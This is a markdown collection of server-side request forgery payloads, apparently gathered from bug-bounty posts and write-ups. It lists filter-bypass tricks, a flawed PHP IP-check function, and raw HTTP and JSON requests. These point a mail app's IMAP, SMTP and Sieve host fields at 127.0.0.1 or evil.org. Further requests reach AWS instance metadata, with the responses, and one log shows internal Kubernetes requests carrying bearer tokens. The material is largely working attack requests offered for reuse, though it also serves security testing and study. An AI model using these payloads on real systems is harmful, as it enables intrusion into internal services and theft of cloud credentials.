# Payloads — ssrf

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. SSRF via localtest.me; open-redirect filter bypasses; CSRF token bypass by switching to GET
- Researcher: @zseano
- Post: https://x.com/zseano/status/1261995808553132032
- Sources: `posts/zseano/ARCHIVE.md`, `data/x_posts.jsonl`

```
SSRF: http://localtest.me ; open URL: /%255C and /%0d/ ; CSRF: change POST→GET to drop token requirement
```

## 2. SSRF via filter bypass due to lax checking on IPs
- Source: `telegram writeups (verbatim excerpts)`

```
public function ThrowIfLocalIp(string $ip) : void {
		$localRanges = [
			'100.64.0.0/10', // See RFC 6598
			'192.0.0.0/24', // See RFC 6890
		];
		if (
			(bool)filter_var($ip, FILTER_VALIDATE_IP) &&
			(
				!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
				IpUtils::checkIp($ip, $localRanges)
			)) {
			$this->logger->warning("Host $ip was not connected to because it violates local access rules");
			throw new LocalServerException('Host violates local access rules');
		}

		// Also check for IPv6 IPv4 nesting, because that's not covered by filter_var
		if ((bool)filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && substr_count($ip, '.') > 0) {
			$delimiter = strrpos($ip, ':'); // Get last colon
			$ipv4Address = substr($ip, $delimiter + 1);

			if (
				!filter_var($ipv4Address, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
				IpUtils::checkIp($ip, $localRanges)) {
				$this->logger->warning("Host $ip was not connected to because it violates local access rules");
				throw new LocalServerException('Host violates local access rules');
			}
		}
	}
```

## 3. SSRF via filter bypass due to lax checking on IPs
- Source: `telegram writeups (verbatim excerpts)`

```
<?php
      require 'vendor/autoload.php';
      use Symfony\Component\HttpFoundation\IpUtils;

      function ThrowIfLocalIp(string $ip) : void {
        $localRanges = [
            '100.64.0.0/10', // See RFC 6598
            '192.0.0.0/24', // See RFC 6890
        ];
        if (
            (bool)filter_var($ip, FILTER_VALIDATE_IP) &&
            (
                !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
                IpUtils::checkIp($ip, $localRanges)
            )) {
            throw new Exception('Host violates local access rules');
        }

        // Also check for IPv6 IPv4 nesting, because that's not covered by filter_var
        if ((bool)filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && substr_count($ip, '.') > 0) {
            $delimiter = strrpos($ip, ':'); // Get last colon
            $ipv4Address = substr($ip, $delimiter + 1);

            if (
                !filter_var($ipv4Address, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
                IpUtils::checkIp($ip, $localRanges)) {
                throw new Exception('Host violates local access rules');
            }
        }
        echo "Pass";
    }
    ThrowIfLocalIp($_GET["ip"])
?>
```

## 4. Mail app - blind SSRF via smtpHost parameter
- Source: `telegram writeups (verbatim excerpts)`

```
{"imapHost":"ssl0.ovh.net","imapPort":993,"imapSslMode":"ssl","imapUser":"redacted","imapPassword":"redacter","smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none","smtpUser":"xx","smtpPassword":"xx","accountName":"Test1","emailAddress":"xxx@xxx.org"}
```

## 5. Mail app - Blind SSRF via Sierve server fonctionnality and sieveHost parameter
- Source: `telegram writeups (verbatim excerpts)`

```
PUT /apps/mail/api/sieve/account/5 HTTP/2
Host: redacted
Cookie: redactedr
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Requesttoken: redacted
Content-Length: 117
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"sieveEnabled":true,"sieveHost":"evil.org","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

## 6. Mail app - Blind SSRF via Sierve server fonctionnality and sieveHost parameter
- Source: `telegram writeups (verbatim excerpts)`

```
{"sieveEnabled":true,"sieveHost":"127.0.0.1","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

## 7. Mail app - blind SSRF via imapHost parameter
- Source: `telegram writeups (verbatim excerpts)`

```
POST /apps/mail/api/accounts HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Requesttoken: redacted
Content-Length: 333
Origin:  redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"imapHost":"myimapserver.org","imapPort":993,"imapSslMode":"tls","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpHost":"mysmtpserver.org","smtpPort":465,"smtpSslMode":"tls","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.orgr","emailAddress":"xxx@xxx.org"}
```

## 8. Mail app - blind SSRF via imapHost parameter
- Source: `telegram writeups (verbatim excerpts)`

```
{"imapHost":"127.0.0.1","imapPort":<port_number>,"imapSslMode":"none","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpSslMode":"none","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.org","emailAddress":"xxx@xxx.org"}
```

## 9. SSRF vulnerability can be exploited when a hijacked aggregated api server such as metrics-server returns 30X
- Source: `telegram writeups (verbatim excerpts)`

```
2022/04/16 00:30:13 src IP: 20.51.80.40:4096
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer <omitted>
User-Agent: azurepolicyaddon/v0.0.0 (linux/amd64) kubernetes/$Format

GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/vnd.kubernetes.protobuf, */*
Authorization: Bearer <omitted>
User-Agent: kube-controller-manager/v1.17.13 (linux/amd64) kubernetes/f4a8e76/system:serviceaccount:kube-system:generic-garbage-collector

2022/04/16 00:34:37 src IP: 20.69.190.88:21504
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer  <omitted>
User-Agent: cpmonitor/v0.0.0 (linux/amd64) kubernetes/$Format
```

## 10. Full read SSRF at  [HtUS]
- Source: `telegram writeups (verbatim excerpts)`

```
""
failed
"SyntaxError: Unexpected token a in JSON at position 0"
REQUEST SUPERREQUEST
_______________________________________
POST /latest/meta-data?/statements HTTP/1.1
X-Experience-API-Version: 1.0.3
Authorization: Basic dGVzdDp0ZXN0
host: ██████████
accept: application/json
content-type: application/json
content-length: 324
Connection: close

{"actor":{"objectType":"Agent","name":"xAPI mbox","mbox":"mailto:████"},"verb":{"id":"http://███","display":{"en-GB":"attended","en-US":"attended"}},"object":{"objectType":"Activity","id":"http://www.example.com/meetings/occurances/34534"},"id":"3b9e4565-07ac-475f-be1f-d5f590f40779"}

RESPONSE SUPERREQUEST
_______________________________________
HTTP/1.0 200 OK
accept-ranges: bytes
content-length: 326
content-type: text/plain
date: Wed, 06 Jul 2022 13:48:12 GMT
last-modified: Thu, 30 Jun 2022 09:37:12 GMT
connection: close
server: EC2ws

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
=======================================
REQUEST SUPERREQUEST
_______________________________________
GET /latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779 HTTP/1.1
X-Experience-API-Version: 1.0.3
Authorization: Basic dGVzdDp0ZXN0
host: ██████
Connection: close

RESPONSE SUPERREQUEST
_______________________________________
HTTP/1.0 200 OK
accept-ranges: bytes
content-length: 326
content-type: text/plain
date: Wed, 06 Jul 2022 13:48:12 GMT
last-modified: Thu, 30 Jun 2022 09:37:12 GMT
connection: close
server: EC2ws

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
=======================================
```

## 11. SSRF ACCESS AWS METADATA -
- Source: `telegram writeups (verbatim excerpts)`

```
GET /api/v1/download-url?url=http://█████/latest/meta-data/ HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Allow-Origin: *
Referer: https://████/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
```
